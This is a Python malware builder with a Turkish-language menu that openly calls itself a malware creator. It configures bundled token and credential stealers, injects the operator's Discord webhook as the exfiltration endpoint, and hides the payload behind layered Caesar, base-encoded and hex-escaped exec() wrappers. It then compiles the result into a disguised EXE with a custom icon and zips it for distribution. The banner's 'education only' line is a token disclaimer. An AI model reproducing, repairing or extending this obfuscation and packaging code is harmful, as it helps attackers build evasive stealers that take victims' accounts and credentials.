import os
import requests
import colorama
import base64
import random
import shutil
import time
import string
import json
from pypresence import Presence
# Function for the discord rich presence
def rich_presence():
    try:
        rpc = Presence("1221157497897750559")
        rpc.connect()
        rpc.update(
            large_image= "resolution_logo",
            large_text = f"AlexBabaproZingo",
            details = f"Python kötü amaçlı yazılım oluşturucu",
            state = "By Alex",
            buttons=[{"label": "Discord", "url": "https://discord.gg/KKT7tqAtQY"}]
        )
    except Exception as e:
        pass

# <---- FILE MANAGEMENT FUNCTIONS ---->
# Function to read a file 
def readfile(path):
    with open(path, 'r', encoding='UTF-8') as f:
        data = f.read()
    return data

# Fonction to write a file
def writefile(path, data):
    with open(path, 'w', encoding='UTF-8') as f:
        f.write(data)

# Function to read a json
def read_json(file_path: str) -> dict:
    with open(file_path, 'r') as json_file:
        data = json.load(json_file)
    return data

# Function to write a json
def write_json(file_path: str, data: dict) -> None:
    with open(file_path, 'w') as json_file:
        json.dump(data, json_file)

# Function to update a json (add a new value)
def update_json(param, value):
    json_data = read_json(f"{os.getcwd()}\\utilities\\config.json")
    json_data[f"{param}"] = str(value)
    write_json(f"{os.getcwd()}\\utilities\\config.json", json_data)

# Function to get the settings stored in config.json
def get_settings():
    with open(f"{os.getcwd()}\\utilities\\config.json", 'r') as json_file:
        json_data = json.load(json_file)
    return json_data["name"], json_data["path"], json_data["requirements"], json_data["webhook"], json_data["exe_yn"], json_data["exe_comp"], json_data["icon"]

# <---- ALL WEBHOOKS FUNCTIONS ---->
# Function to check a webhook (return: Valid or invalid)
def webhook_checker(webhook_link):
    try:
        resp = requests.get(webhook_link)
        if resp.status_code != 200:
            return "Geçersiz"
        else:
            return "Geçerli"
    except Exception as e: 
        return "Geçersiz" 

# <---- PART MANAGEMENT FUNCTIONS ---->
# Function to hash the malware script to create part
def script_hasher(script):
    nb_parties = random.randint(5, 10)
    longueur_partie = len(script) // nb_parties
    parties = [script[i * longueur_partie:(i + 1) * longueur_partie] for i in range(nb_parties - 1)]
    parties.append(script[(nb_parties - 1) * longueur_partie:])
    return parties

# Function to encode a part in base64
def base64_encoder(data):
    bytes_text = data.encode('UTF-8')
    b64_text = base64.b64encode(bytes_text)
    return b64_text.decode('UTF-8')

# Function to encode a part in base32
def base32_encoder(data):
    bytes_text = data.encode('UTF-8')
    b32_text = base64.b32encode(bytes_text)
    return b32_text.decode('UTF-8')

# Function to encode a part in base16
def base16_encoder(data):
    bytes_text = data.encode('UTF-8')
    b16_text = base64.b16encode(bytes_text)
    return b16_text.decode('UTF-8')

# Function to encode a part with Caesar method (return final encoded parts)
def caesar_encoder(part, alpha):
    key = ''.join(random.sample(alpha, 2))
    gap = sum(ord(c) for c in key) % 26
    text_int = ''
    for c in part:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 + gap) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 + gap) % 26 + 65)
        else:
            c_int = c
        text_int += c_int
    return base64_encoder(text_int + key)

def injector_encoder(part, alpha):
    key = ''.join(random.sample(alpha, 2))
    gap = sum(ord(c) for c in key) % 26
    text_int = ''
    for c in part:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 + gap) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 + gap) % 26 + 65)
        else:
            c_int = c
        text_int += c_int
    return text_int + key


# <---- INJECTOR COMPILATION FUNCTIONS ---->

# Function to obfuscate the injector code 
def obfuscate(injector_script):
    encoding = random.choice(['b64', 'b32', 'b16'])
    first_step = injector_encoder(injector_script, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    #base 64 system
    if encoding == 'b64':
        content = '''import base64
def cl34n0r(r4w):
    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d3ctxt = base64.b64decode(r4w).decode('UTF-8')
    k3y = d3ctxt[-2:]
    g4p = sum(ord(c) for c in k3y) % 26
    txt1nt = ''
    for c in d3ctxt[:-2]:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 - g4p + 26) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 - g4p + 26) % 26 + 65)
        else:
            c_int = c
        txt1nt += c_int
    return txt1nt
exec(cl34n0r("""R4W"""))'''.replace('R4W', base64_encoder(first_step))
    #base 32 system
    elif encoding == 'b32':
        content = '''import base64
def cl34n0r(r4w):
    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d3ctxt = base64.b32decode(r4w).decode('UTF-8')
    k3y = d3ctxt[-2:]
    g4p = sum(ord(c) for c in k3y) % 26
    txt1nt = ''
    for c in d3ctxt[:-2]:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 - g4p + 26) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 - g4p + 26) % 26 + 65)
        else:
            c_int = c
        txt1nt += c_int
    return txt1nt
exec(cl34n0r("""R4W"""))'''.replace('R4W', base32_encoder(first_step))
    #base 16 system
    elif encoding == 'b16':
        content = '''import base64
def cl34n0r(r4w):
    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d3ctxt = base64.b16decode(r4w).decode('UTF-8')
    k3y = d3ctxt[-2:]
    g4p = sum(ord(c) for c in k3y) % 26
    txt1nt = ''
    for c in d3ctxt[:-2]:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 - g4p + 26) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 - g4p + 26) % 26 + 65)
        else:
            c_int = c
        txt1nt += c_int
    return txt1nt
exec(cl34n0r("""R4W"""))'''.replace('R4W', base16_encoder(first_step))
    
    # choice of random letters for obfuscation
    ltr = ''.join(random.choices(string.ascii_uppercase, k=4))
    OFFSET = 10
    VARIABLE_NAME = f'__{ltr}_{ltr}' * 100
    b64_content = base64.b64encode(content.encode()).decode()
    index = 0
    code = f'{VARIABLE_NAME} = ""\n'
    for _ in range(int(len(b64_content) / OFFSET) + 1):
        _str = ''
        for char in b64_content[index:index + OFFSET]:
            byte = str(hex(ord(char)))[2:]
            if len(byte) < 2:
                byte = '0' + byte
            _str += '\\x' + str(byte)
        code += f'{VARIABLE_NAME} += "{_str}"\n'
        index += OFFSET
    code += f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({VARIABLE_NAME}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
    return code

#function to build the injector 
def builder(banner, m, w):
    name, path_, requirements, webhook, exe_yn, exe_comp, icon = get_settings()
    
    if not os.path.exists(path_):
        os.system("cls")
        print(f"{banner}\n\n {w}[{m}!{w}] The path seems to be incorrect...")
        time.sleep(3)
        main()
    elif webhook_checker(webhook) != "Geçerli":
        os.system("cls")
        agree = input(f"{banner}\n\n {m}[{w}!{m}]{w} Girdiğiniz webhook yanlış görünüyor. Webhook kullanmadan devam etmek istiyor musunuz? (y/n) ?\n ---\n {m}[{w}->{m}]{w} ")
        if agree == 'y':
            pass
        elif agree == 'n':
            main()
        else:   main()     
    elif not name:
        os.system("cls")
        print(f"{banner}\n\n {w}[{m}!{w}] Lütfen geçerli bir ad girin!")
        time.sleep(3)
        main()
    
    try:
        alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        src_hashed = script_hasher(readfile(path_).replace('WBH', webhook))
        recompyler = readfile(os.path.join(os.getcwd(), 'utilities', 'recompyler.cs'))
        src_hashed = [caesar_encoder(part, alpha) for part in src_hashed]

        injector_with_all = readfile(os.path.join(os.getcwd(), 'utilities', 'injector.py')).replace("'RECOMPYLER'", recompyler)
        injector_with_all = injector_with_all.replace("'SRC_HASHED'", str(src_hashed))
        injector_with_all = injector_with_all.replace("'PIPREQUIREMENTS'", str(readfile(requirements)))

        if os.path.exists(name):
            shutil.rmtree(name, ignore_errors=True)
            os.makedirs(name)
        else: os.makedirs(name)
        
        writefile(f'{name}\\{name}.py', obfuscate(injector_with_all))

        if exe_yn == "y":
            script_name = os.path.join(os.getcwd(), name, f"{name}.py")
            target_dir = f"{name}-exe"
            icon_option = f"--icon={icon}" if icon != "Hiçbiri" else ""
            
            if exe_comp == "Cx_freeze":
                cmd = f"""cxfreeze -c "{script_name}" --target-dir {name}-exe {icon_option} --packages=win32api --packages=win32con --packages=platform"""
            elif exe_comp == "Pyinstaller":
                cmd = f"""pyinstaller --noconfirm --onefile --console {icon_option} --distpath {target_dir} --hidden-import win32api --hidden-import win32con --hidden-import platform "{script_name}" """
            os.system("cls")
            os.system(cmd)
            
            if exe_comp == "Pyinstaller":
                shutil.rmtree("build", ignore_errors=True)
                try: os.remove(name + '.spec')
                except: pass
            
            shutil.make_archive(f"{name}-exe", 'zip', name + "-exe")
            shutil.rmtree(f"{name}-exe", ignore_errors=True)
            
        shutil.make_archive(name, 'zip', name)
        shutil.rmtree(name, ignore_errors=True)
            
        os.system("cls")
        input(f"{banner}\n\n {w}[{m}+{w}] {name} kötü amaçlı yazılımınız başarıyla oluşturuldu ({name}.zip))!")
        main()
    
    except Exception as e:
        os.system("cls")
        print(e) #print error 
        input(f"{banner}\n\n {w}[{m}!{w}] Kötü amaçlı yazılım oluşturulurken bir hata oluştu!")
        
# <---- GUI PARTS FUNCTIONS ---->
# Function to show the settings menu
def settings_menu(banner, w, m):
    while True:
        os.system("cls")
        print(f"{banner}\n -----\n")
        print(f" {m}[{w}+{m}]{w} Kötü amaçlı yazılım kurulumu:\n")
        print(f" {m}[{w}1{m}]{w} Kötü amaçlı yazılımınızı seçin    | {m}[{w}4{m}]{w} EXE ayarı")
        print(f" {m}[{w}2{m}]{w} Kötü amaçlı yazılımın adını değiştir    | {m}[{w}5{m}]{w} geri dön")
        print(f" {m}[{w}3{m}]{w} Kötü amaçlı yazılım webhook'unu değiştir")
        choice_settings = input(f"\n {m}[{w}->{m}]{w} seç birini: ")
        
        if choice_settings == "1": # change the malware
            choice_rat(banner, w, m)
            
        elif choice_settings == "2": # change the malware name
            os.system("cls")
            name = input(f"{banner}\n\n {w}[{m}+{w}] Kötü amaçlı yazılımın adını buraya girin: ")
            update_json("name", name)
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} Kötü amaçlı yazılım adı başarıyla güncellendi ({name}) !")
            time.sleep(3)
            
        elif choice_settings == "3": # change the webhook
            os.system("cls")
            webhook = input(f"{banner}\n\n {m}[{w}+{m}]{w} Webhook'unuzu buraya girin: ")
            update_json("webhook", webhook)
            os.system("cls")
            if webhook_checker(webhook) == "Geçersiz":
                print(f"{banner}\n\n {m}[{w}!{m}]{w} Girdiğiniz webhook hatalı görünüyor.")
                time.sleep(3)
            else: print(f"{banner}\n\n {m}[{w}+{m}]{w} Kötü amaçlı yazılım webhook'u başarıyla güncellendi !"), time.sleep(3)
            
        elif choice_settings == "4": # acces to the executable settings
            exe_settings(banner, w, m)
            
        elif choice_settings == "5": # exit to previous menu
            os.system("cls")
            main()
            
# Function to show executable settings 
def exe_settings(banner, w, m):
    while True:
        exe_yn, exe_comp = get_settings()[4:6]
        os.system("cls")
        print(f"{banner}\n -----\n")
        print(f" {m}[{w}+{m}]{w} EXE seçimi:\n")
        print(f" {m}[{w}1{m}]{w} Açık/Kapalı               | {m}[{w}3{m}]{w} Exe logosunu değiştir")
        print(f" {m}[{w}2{m}]{w} Derleyiciyi değiştir      | {m}[{w}4{m}]{w} geri dön")

        choice_exe = input(f"\n {m}[{w}->{m}]{w} Seçiminizi buraya girin: ")

        if choice_exe == "1": # Exe obfuscation activation
            os.system("cls")
            res = input(f"{banner}\n\n {m}[{w}+{m}]{w} {'Dea' if exe_yn == 'y' else 'A'}ctivate EXE compilation ? (y/n): ")
            if res == "y":
                update_json("exe_yn", "n" if exe_yn == 'y' else 'y')
                os.system("cls")
                print(f"{banner}\n\n {m}[{w}+{m}]{w} Kötü amaçlı yazılımınız {'artık olmayacak' if exe_yn == 'y' else 'be'} exe'ye dönüştürülecek!")
                time.sleep(3)

        elif choice_exe == "2": # Compiler choice
            os.system("cls")
            print(f"{banner}\n -----\n")
            print(f" {m}[{w}+{m}]{w} Derleyici seçimi:\n")
            print(f" {m}[{w}1{m}]{w} Cx Freeze {'(seçili)' if exe_comp == 'Cx_freeze' else ''}")
            print(f" {m}[{w}2{m}]{w} Pyinstaller {'(seçili)' if exe_comp == 'Pyinstaller' else ''}")
            print(f" -----\n {m}[{w}3{m}]{w} geri dön")

            choice_compiler = input(f"\n {m}[{w}->{m}]{w} seç birini: ")

            if choice_compiler in ["1", "2"]: 
                compiler = "Cx_freeze" if choice_compiler == "1" else "Pyinstaller"
                update_json("exe_comp", compiler)
                os.system("cls")
                print(f"{banner}\n\n {m}[{w}+{m}]{w} {compiler} derleyicisi başarıyla seçildi!")
                time.sleep(3)

        elif choice_exe == "3": # Logo changer
                os.system("cls")
                logo_path = input(f"{banner}\n\n {m}[{w}+{m}]{w} .ico'nuzu buraya girin (logo yoksa 'Hiçbiri' girin): ")
                if logo_path is None or not logo_path.endswith('.ico'):
                    os.system("cls")
                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Geçersiz logo (boşluk ve tırnak işareti olmayan bir yol kullanın)! ")
                    time.sleep(3)
                else:
                    update_json("icon", logo_path)
                    os.system("cls")
                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Logonuz başarıyla seçildi !")
                    time.sleep(3)
        
        elif choice_exe == "4":
            settings_menu(banner, w, m)

# Function to change the malware
def choice_rat(banner, w, m):
    while True:
        os.system("cls")
        print(f"{banner}\n -----\n")
        print(f" {m}[{w}+{m}]{w} Malware choice:\n")
        print(f" {m}[{w}1{m}]{w} Cooked Grabber   | {m}[{w}4{m}]{w} Kendi py malware'inizi seçin")
        print(f" {m}[{w}2{m}]{w} Discord-Token-Grabber    | {m}[{w}5{m}]{w} geri dön")
        print(f" {m}[{w}3{m}]{w} Creal-Stealer               |")
        choice_rat = input(f"\n {m}[{w}->{m}]{w} Seç birini: ")
        
        if choice_rat == "1": #Cookedgrabber
            os.system("cls")
            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "Cooked-grabber.py" ))
            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "requirements.txt" ))
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} Sıçan şu şekilde başarıyla tanımlanmıştır: cooked grabber!")
            time.sleep(3)
        
        elif choice_rat == "2": # Classic token grabber
            os.system("cls")
            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "Token-grabber.py" ))
            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "requirements.txt" ))
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} Kötü amaçlı yazılım şurada başarıyla tanımlandı: Token kapmaca !")
            time.sleep(3)
        
        elif choice_rat == "3": # Creal Stealer
            os.system("cls")
            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "Creal.py" ))
            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "requirements.txt" ))
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} Kötü amaçlı yazılım şurada başarıyla tanımlandı: Creal-Stealer !")
            time.sleep(3)
        
        elif choice_rat == "4": # Personnal choice
            os.system("cls")
            input(f"{banner}\n\n {m}[{w}!{m}]{w} Uyarı: Kendi kötü amaçlı yazılımınızı seçerseniz webhook'unuzu manuel olarak girmeniz gerekir !\n ----\n {m}[{w}+{m}]{w} Press enter to continue...")
            os.system("cls")
            path = input(f"{banner}\n\n {w}[{m}+{w}] Kötü amaçlı yazılım yolunuzu buraya girin: ")
            req = input(f" -----\n {w}[{m}+{w}] Kötü amaçlı yazılım gereksinimlerinizi buraya girin: ")
            update_json("path", path)
            update_json("requirements", req )
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} Kötü amaçlı yazılım şurada başarıyla tanımlandı: {os.path.basename(path)} !")
            time.sleep(3)
        
        elif choice_rat == "5": # Back to menu 
            settings_menu(banner, w, m)


# <---- MAIN FUNCTION WITH GUI INCLUDED ---->
def main():
    m = colorama.Fore.LIGHTMAGENTA_EX
    w = colorama.Fore.LIGHTWHITE_EX
    banner = f"""\n                                                   
                                                  
   ,---,          ,--,                            
  '  .' \       ,--.'|                            
 /  ;    '.     |  | :                            
:  :       \    :  : '                ,--,  ,--,  
:  |   /\   \   |  ' |       ,---.    |'. \/ .`|  
|  :  ' ;.   :  '  | |      /     \   '  \/  / ;  
|  |  ;/  \   \ |  | :     /    /  |   \  \.' /   
'  :  | \  \ ,' '  : |__  .    ' / |    \  ;  ;   
|  |  '  '--'   |  | '.'| '   ;   /|   / \  \  \  
|  :  :         ;  :    ; '   |  / | ./__;   ;  \ 
|  | ,'         |  ,   /  |   :    | |   :/\  \ ; 
`--''            ---`-'    \   \  /  `---'  `--`  
                            `----'                
                                                  
 {w}by Alex | Sadece eğitim veya iyi amaçlar için""".replace('█', f'{w}█{m}')
    
    rat_name, rat_path, requirements, webhook, exe_yn, exe_comp, logo = get_settings()
    exe_yn_ehn = "Evet" if exe_yn == "y" else "Hayır" if exe_yn == "n" else "Hata"
    exe_comp_ehn = exe_comp if exe_yn == "y" else "hiçbiri" if exe_yn == "n" else "Hata"
    req_check = "Geçerli" if os.path.exists(requirements) else "Geçersiz"
    
    webhook_info = webhook_checker(webhook)
    choices = {
        "1": lambda: builder(banner, m, w), # launch the malware build
        "2": lambda: settings_menu(banner, w, m), # access to the setting menu 
        "3": lambda: exit() # exit builder
    }

    while True:
        os.system("cls")
        print(f"""{banner}\n -----\n
 {m}[{w}+{m}]{w} Menu:              |    {m}[{w}Bilgi{m}]{w} Mevcut Ayarlar:            
                        |
 {m}[{w}1{m}]{w} Oluştur              |    {m}[{w}>{m}]{w} Virüsün Adı: {"Unselected" if rat_name == '' else rat_name} {m}[{w}>{m}]{w} Webhook: {webhook_info}
 {m}[{w}2{m}]{w} Kurulum              |    {m}[{w}>{m}]{w} yazılım yolu: {"Geçersiz" if rat_path == '' else os.path.basename(rat_path)} {m}[{w}>{m}]{w} ExE derleyicisi: {exe_yn_ehn} | {exe_comp_ehn}
 {m}[{w}3{m}]{w} Çıkış               |    {m}[{w}>{m}]{w} Gereksinimler yolu: {req_check} {m}[{w}>{m}]{w} Logo: {os.path.basename(logo) if logo != "hicbiri" else "hicbiri"} """) 
        
        choice = input(f"\n {m}[{w}->{m}]{w} seç birini: ")
        if choice in choices:
            choices[choice]()
        else:
            os.system("cls")
            print(f"{banner}\n\n {w}[{m}!{w}] Geçersiz seçenek, lütfen tekrar deneyin.")
            time.sleep(2)
            os.system("cls")
            continue
    
# Start main & rich presence  
if __name__ == '__main__':
    os.system(f"title Alex Virüs Oluşturucu")
    rich_presence()
    main()
